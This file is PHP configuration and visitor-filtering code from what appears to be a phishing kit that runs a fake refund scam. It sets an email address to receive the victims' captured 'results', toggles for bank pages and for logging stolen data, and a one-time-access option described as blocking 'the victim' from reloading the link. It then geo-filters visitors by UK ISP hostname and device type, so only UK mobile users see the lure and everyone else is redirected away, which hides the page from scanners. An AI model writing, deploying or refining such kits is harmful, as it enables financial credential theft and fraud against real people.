<?php

$my_email = "imnotspamming@yandex.com"; // PUT YOUR EMAIL HERE
$refund = rand(220, 340) . "." . rand(10, 99); // REFUND AMOUNT
$logsresults = "1"; // ENABLE/DISABLE BANK PAGES
$Send_Log=1;  // SEND RESULTS TO EMAIL
$Save_Log=1;  // SAVE RESULTS TO CPANEL
$One_Time_Access=0; // ONE TIME ACCESS, THIS PREVENTS THE VICTIM FROM LOADING THE LINK AGAIN AFTER SUBMIT
$Encrypt=0; // THIS FEATURE ENCRYPTS THE RESULTS AND CAN BE DECRYPTED WITH REDCRYPT
$password = '123'; // PASSWORD TO DECRYPT, CAN BE CHANGED


function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}
function isMobile() {return preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);}
if(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), "threembb.co.uk") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		$BOBSNOB=false;
	}
	else{
		$BOBSNOB=true;
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), "in-addr.btopenworld.com") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		$BOBSNOB=false;
	}
	else{
		$BOBSNOB=true;
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), "bb.isp.sky.com") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		$BOBSNOB=false;
	}
	else{
		$BOBSNOB=true;
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), ".bcube.co.uk") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		$BOBSNOB=false;
	}
	else{
		$BOBSNOB=true;
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), ".host.pobb.as") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		$BOBSNOB=false;
	}
	else{
		$BOBSNOB=true;
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), ".cable.virginm.net") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		$BOBSNOB=false;
	}
	else{
		$BOBSNOB=true;
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), ".skybroadband.com") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		$BOBSNOB=false;
	}
	else{
		$BOBSNOB=true;
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), "static.virginmediabusiness.co.uk") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		$BOBSNOB=false;
	}
	else{
		$BOBSNOB=true;
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), "btcentralplus.com") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		$BOBSNOB=false;
	}
	else{
		$BOBSNOB=true;
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), "bb.sky.com") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		$BOBSNOB=false;
	}
	else{
		$BOBSNOB=true;
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), "dyn.plus.net") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		$BOBSNOB=false;
	}
	else{
		$BOBSNOB=true;
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), "as13285.net") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		$BOBSNOB=false;
	}
	else{
		$BOBSNOB=true;
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), ".murphx.net") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		$BOBSNOB=false;
	}
	else{
		$BOBSNOB=true;
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), ".dynamic.dsl.as") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		$BOBSNOB=false;
	}
	else{
		$BOBSNOB=true;
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), "dab.02.net") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		$BOBSNOB=false;
	}
	else{
		$BOBSNOB=true;
	}}
else{
	header("Location: https://thesun.co.uk");
}
if($BOBSNOB){
	header("Location: ../../index.php");
}
?>